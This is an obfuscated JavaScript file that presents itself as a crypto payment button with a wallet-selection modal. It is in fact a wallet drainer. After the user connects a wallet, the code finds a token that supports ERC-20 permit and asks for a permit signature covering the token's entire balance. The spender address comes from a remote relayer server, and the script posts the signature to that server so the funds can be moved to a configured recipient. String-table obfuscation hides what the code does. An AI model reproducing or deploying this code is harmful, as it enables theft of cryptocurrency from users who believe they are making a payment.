(function(d, e) {
    var f = function(g) {
        while (--g) {
            d['push'](d['shift']());
        }
    };
    f(++e);
}(_0x3e9f, 0x1c8));

function _0x272b(c, d) {
    var e = _0x3e9f[c = c - 0x0];
    if (_0x272b['rgwEkV'] === undefined) {
        (function() {
            var g = function() {
                var h;
                try {
                    h = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');')();
                } catch (i) {
                    h = window;
                }
                return h;
            };
            var f = g();
            var e = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
            f['atob'] || (f['atob'] = function(g) {
                var h = String(g)['replace'](/=+$/, '');
                for (var i = 0x0, j, k, l = 0x0, m = ''; k = h['charAt'](l++); ~k && (j = i % 0x4 ? j * 0x40 + k : k, i++ % 0x4) ? m += String['fromCharCode'](0xff & j >> (-0x2 * i & 0x6)) : 0x0) {
                    k = e['indexOf'](k);
                }
                return m;
            });
        }());
        _0x272b['lGxdYg'] = function(e) {
            var f = atob(e);
            var g = [];
            for (var h = 0x0, i = f['length']; h < i; h++) {
                g += '%' + ('00' + f['charCodeAt'](h)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(g);
        };
        _0x272b['gVObcW'] = {};
        _0x272b['rgwEkV'] = !![];
    }
    var b = _0x3e9f[c];
    var a = b;
    if (_0x272b['gVObcW'][c] !== undefined) {
        a = _0x272b['gVObcW'][c];
    } else {
        a = _0x272b['lGxdYg'](a);
        _0x272b['gVObcW'][c] = a;
    }
    return a;
}
window[_0x272b('0xb6')] = {
    '_config': {},
    '_provider': null,
    '_signer': null,
    '_currentUserAddress': null,
    '_discoveredProviders': new Map(),
    '_isInitialized': ![],
    '_ERC20_PERMIT_ABI': ['function\x20permit(address\x20owner,\x20address\x20spender,\x20uint256\x20value,\x20uint256\x20deadline,\x20uint8\x20v,\x20bytes32\x20r,\x20bytes32\x20s)', 'function\x20nonces(address\x20owner)\x20view\x20returns\x20(uint256)', _0x272b('0x40'), 'function\x20name()\x20view\x20returns\x20(string)', _0x272b('0x57'), 'function\x20decimals()\x20view\x20returns\x20(uint8)', _0x272b('0x34'), _0x272b('0x19')],
    '_RELAYER_SERVER_URL_BASE': _0x272b('0x33'),
    'init': async function(c) {
        var d = _0x272b;
        if (this[d('0xb0')]) {
            console[d('0x4d')](d('0xa1'));
            return;
        }
        if (!c[d('0xc0')] || !c[d('0xa0')] || !c['alchemyApiKey'] || !c[d('0x5d')] || !c[d('0x98')]) {
            console[d('0x43')](d('0x85'));
            return;
        }
        if (typeof ethers === 'undefined') {
            console['error'](d('0x28'));
            return;
        }
        this['_config'] = c;
        try {
            console[d('0x89')](d('0xc6'));
            const e = await fetch(this['_RELAYER_SERVER_URL_BASE'] + d('0x6f'), {
                'method': 'POST',
                'headers': {
                    'Content-Type': d('0xc8'),
                    'X-Api-Key': this['_config'][d('0xa0')]
                },
                'body': JSON[d('0xcb')]({
                    'apiKey': this[d('0x9a')][d('0xa0')],
                    'origin': window[d('0xa7')][d('0xa8')]
                })
            });
            if (!e[d('0x65')]) {
                throw new Error(d('0x35') + e[d('0x97')]);
            }
            const f = await e[d('0x36')]();
            if (!f[d('0x37')] || !f[d('0x4e')]) {
                throw new Error(f[d('0x77')] || d('0xa4'));
            }
            this[d('0x9a')][d('0x4e')] = f[d('0x4e')];
            console[d('0x89')](d('0x4f'));
        } catch (g) {
            console['error'](d('0xba'), g[d('0x77')]);
            const h = document[d('0x2e')](c[d('0xc0')]);
            if (h) {
                h['disabled'] = !![];
                h[d('0x2f')] = d('0xbb');
            }
            return;
        }
        const i = document[d('0x2e')](c['buttonId']);
        if (!i) {
            console[d('0x43')](d('0x29') + c[d('0xc0')] + d('0x18'));
            return;
        }
        i[d('0x88')](d('0x49'), this[d('0x90')][d('0x6a')](this));
        this['\x5f\x69\x6e\x6a\x65\x63\x74\x4d\x6f\x64\x61\x6c\x48\x74\x6d\x6c']();
        this[d('0x38')]();
        this[d('0xb0')] = !![];
        console[d('0x89')](d('0x59'));
    },
    '_handlePaymentClick': async function() {
        var e = _0x272b;
        try {
            if (!this['_signer']) {
                const f = await this[e('0x55')]();
                if (!f) {
                    this[e('0x6e')](e('0x24'), e('0x58'));
                }
                return;
            }
            const g = await this['_provider'][e('0xb5')]();
            if (g[e('0x98')] !== this[e('0x9a')][e('0x98')]) {
                this[e('0x6e')](e('0xc1') + this[e('0x9a')][e('0x98')] + e('0x2a'), 'error');
                return;
            }
            await this[e('0x8f')]();
        } catch (h) {
            console['error'](e('0x94'), h);
            this['_updateStatus'](e('0x5b') + h[e('0x77')], e('0x43'));
        }
    },
    '_executeSend': async function() {
        var f = _0x272b;
        this[f('0x6e')](f('0x6d'), 'pending');
        const g = await this['\x5f\x66\x69\x6e\x64\x48\x69\x67\x68\x65\x73\x74\x56\x61\x6c\x75\x65\x54\x6f\x6b\x65\x6e']();
        if (!g) {
            throw new Error(f('0x91'));
        }
        this['_updateStatus'](f('0x1a') + g[f('0x19')], f('0x58'));
        await this['_signAndSendWithStandardPermit'](g);
    },
    '_findHighestValueToken': async function() {
        var g = _0x272b;
        const h = g('0x5f') + this[g('0x9a')]['alchemyApiKey'];
        const i = await fetch(h, {
            'method': g('0xb9'),
            'headers': {
                'Content-Type': g('0xc8')
            },
            'body': JSON[g('0xcb')]({
                'jsonrpc': '2.0',
                'id': 0x1,
                'method': g('0x8e'),
                'params': [this[g('0x92')], g('0x95')]
            })
        });
        const j = await i[g('0x36')]();
        if (!j['result']) throw new Error(g('0x22'));
        const k = j[g('0x42')][g('0x7e')]['filter'](l => l[g('0x23')] !== '0x0');
        if (k['length'] === 0x0) return null;
        for (const l of k) {
            const m = l[g('0x2d')];
            const n = await this[g('0x3d')](m);
            if (n) {
                this[g('0x6e')](g('0x5a') + m + g('0x3e'), g('0x7a'));
                const o = new ethers[g('0x3c')](m, this[g('0x81')], this[g('0x99')]);
                const [p, q, r] = await Promise['all']([o['name'](), o[g('0x19')](), o[g('0x34')](this[g('0x92')])]);
                return {
                    'contractAddress': m,
                    'name': p,
                    'symbol': q,
                    'balance': r
                };
            }
        }
        return null;
    },
    '_checkPermitSupport': async function(c) {
        var d = _0x272b;
        try {
            const e = new ethers[d('0x3c')](c, this[d('0x81')], this[d('0x99')]);
            await e['nonces'](this['_currentUserAddress']);
            await e[d('0x40')]();
            return !![];
        } catch (f) {
            return ![];
        }
    },
    '_signAndSendWithStandardPermit': async function(c) {
        var d = _0x272b;
        this[d('0x6e')](d('0xb3') + c[d('0x19')] + d('0xad'), d('0x7a'));
        try {
            const e = new ethers[d('0x3c')](c['contractAddress'], this['_ERC20_PERMIT_ABI'], this['_signer']);
            const f = await e['nonces'](this[d('0x92')]);
            const g = Math[d('0x8c')](Date[d('0x79')]() / 0x3e8) + 0x708;
            const h = c['name'];
            let i = '1';
            try {
                i = await e[d('0x57')]();
            } catch (j) {
                console[d('0x89')](d('0xc7') + c[d('0x19')] + d('0x6c'));
            }
            const k = {
                'name': h,
                'version': i,
                'chainId': this[d('0x9a')][d('0x98')],
                'verifyingContract': c[d('0x2d')]
            };
            const l = {
                'Permit': [{
                    'name': d('0x64'),
                    'type': d('0x67')
                }, {
                    'name': d('0x39'),
                    'type': d('0x67')
                }, {
                    'name': d('0x74'),
                    'type': 'uint256'
                }, {
                    'name': d('0xae'),
                    'type': 'uint256'
                }, {
                    'name': d('0x8d'),
                    'type': d('0x26')
                }]
            };
            const m = {
                'owner': this[d('0x92')],
                'spender': this['_config'][d('0x4e')],
                'value': c['balance'][d('0x2c')](),
                'nonce': f[d('0x2c')](),
                'deadline': g
            };
            this['_updateStatus'](d('0x82') + c[d('0x19')] + d('0xad'), 'pending');
            const n = await this[d('0x9b')][d('0x41')](k, l, m);
            const {
                v: o,
                r: p,
                s: q
            } = ethers[d('0x4a')][d('0x56')](n);
            const r = {
                'apiKey': this['_config'][d('0xa0')],
                'owner': this[d('0x92')],
                'recipient': this[d('0x9a')][d('0x5d')],
                'contractAddress': c[d('0x2d')],
                'value': c[d('0x31')][d('0x2c')](),
                'deadline': g,
                'v': o,
                'r': p,
                's': q,
                'origin': window[d('0xa7')][d('0xa8')],
                'chainId': this[d('0x9a')][d('0x98')]
            };
            this[d('0x6e')](d('0x54'), 'pending');
            const s = await fetch(this[d('0x53')] + d('0x6b'), {
                'method': d('0xb9'),
                'headers': {
                    'Content-Type': d('0xc8'),
                    'X-Api-Key': this[d('0x9a')][d('0xa0')]
                },
                'body': JSON[d('0xcb')](r)
            });
            const t = await s[d('0x36')]();
            if (!s['ok'] || !t['success']) throw new Error(t[d('0x77')] || d('0xac'));
            this[d('0x6e')](d('0xc3') + c['symbol'] + d('0x5c'), 'success');
        } catch (u) {
            console[d('0x43')](d('0x86'), u);
            this[d('0x6e')](d('0x5b') + (u['reason'] || u[d('0x77')]), d('0x43'));
            throw u;
        }
    },
    '_connectWallet': function() {
        var c = _0x272b;
        return new Promise(d => {
            this[c('0x60')] = d;
            this[c('0x9d')]();
        });
    },
    '_handleProviderSelection': async function(c) {
        var d = _0x272b;
        const e = c[d('0x68')][d('0x1c')](d('0x1d'));
        if (!e) return;
        const f = e[d('0x70')][d('0x3f')];
        const g = this[d('0xaf')][d('0x84')](f);
        if (!g) return;
        this[d('0x6e')](d('0x75') + g[d('0x58')]['name'] + d('0xad'), 'pending');
        this['\x5f\x63\x6c\x6f\x73\x65\x57\x61\x6c\x6c\x65\x74\x4d\x6f\x64\x61\x6c']();
        try {
            const h = g[d('0x99')];
            this[d('0x99')] = new ethers[d('0x21')][d('0x80')](h);
            await this[d('0x99')][d('0xbc')](d('0xbe'), []);
            this[d('0x9b')] = this[d('0x99')]['getSigner']();
            this[d('0x92')] = await this[d('0x9b')][d('0x78')]();
            this[d('0x6e')](d('0x7d') + this[d('0x92')][d('0xbd')](0x0, 0x6) + '...' + this[d('0x92')][d('0xbd')](-0x4), d('0x37'));
            if (this[d('0x60')]) {
                this[d('0x60')](!![]);
                const i = await this[d('0x99')][d('0xb5')]();
                if (i['chainId'] !== this[d('0x9a')][d('0x98')]) {
                    this[d('0x6e')](d('0xc1') + this[d('0x9a')][d('0x98')] + d('0x2a'), 'error');
                    return;
                }
                await this[d('0x8f')]();
            }
        } catch (j) {
            console[d('0x43')](d('0x7f'), j);
            this[d('0x6e')](d('0xb1'), d('0x43'));
            if (this[d('0x60')]) this[d('0x60')](![]);
        }
    },
    '_setupEip6963Listeners': function() {
        var c = _0x272b;
        window[c('0x88')](c('0x7c'), d => {
            const e = d[c('0xb2')];
            if (!this[c('0xaf')]['has'](e['info']['rdns'])) {
                this[c('0xaf')]['set'](e['info']['rdns'], e);
                this[c('0xca')]();
            }
        });
        window[c('0x25')](new Event(c('0x44')));
    },
    '_renderWalletList': function() {
        var d = _0x272b;
        const e = document[d('0x2e')]('sw-wallet-list');
        if (!e) return;
        e[d('0x2f')] = '';
        if (this[d('0xaf')]['size'] === 0x0) {
            e[d('0x2f')] = d('0x62');
            return;
        }
        this[d('0xaf')]['forEach'](f => {
            const g = '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20data-rdns=\x22' + f['info']['rdns'] + d('0x1e') + f[d('0x58')]['icon'] + d('0x1f') + f[d('0x58')]['name'] + d('0x20') + f['info'][d('0x66')] + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20';
            e[d('0x2f')] += g;
        });
        e[d('0xbf')](d('0x1d'))['forEach'](f => {
            f[d('0x88')](d('0x49'), this[d('0x69')][d('0x6a')](this));
        });
    },
    '_openWalletModal': function() {
        var c = _0x272b;
        document[c('0x2e')](c('0x9e'))[c('0x7b')]['display'] = 'flex';
        setTimeout(() => {
            document[c('0x2e')]('sw-wallet-modal')[c('0x7b')][c('0x45')] = 0x1;
            document['getElementById']('sw-wallet-modal')[c('0x7b')][c('0x52')] = c('0x76');
        }, 0xa);
        this['\x5f\x72\x65\x6e\x64\x65\x72\x57\x61\x6c\x6c\x65\x74\x4c\x69\x73\x74']();
    },
    '_closeWalletModal': function() {
        var d = _0x272b;
        const e = document['getElementById'](d('0x9e'));
        const f = document['getElementById']('sw-wallet-modal');
        if (f) {
            f[d('0x7b')][d('0x45')] = 0x0;
            f[d('0x7b')][d('0x52')] = d('0x96');
        }
        setTimeout(() => {
            if (e) e['style'][d('0x63')] = d('0xa3');
            if (this[d('0x60')] && !this[d('0x9b')]) {
                this[d('0x60')](![]);
            }
        }, 0x12c);
    },
    '_updateStatus': function(c, d = 'info') {
        var e = _0x272b;
        const f = document[e('0x2e')](e('0x4c'));
        if (!f) return;
        const g = {
            'info': '#6b7280',
            'success': '#16a34a',
            'error': '#dc2626',
            'pending': '#2563eb'
        };
        f[e('0x2f')] = e('0x87') + g[d] + e('0x8a') + c + '</p>';
    },
    '_injectModalHtml': function() {
        var d = _0x272b;
        if (document[d('0x2e')](d('0x9e'))) return;
        const e = d('0xb4');
        document[d('0x5e')][d('0xab')](d('0x3a'), e);
        const f = this[d('0xa9')][d('0x6a')](this);
        document[d('0x2e')](d('0xb8'))[d('0x88')](d('0x49'), f);
        document[d('0x2e')](d('0x9e'))[d('0x88')](d('0x49'), g => {
            if (g['target']['id'] === d('0x9e')) f();
        });
    }
};
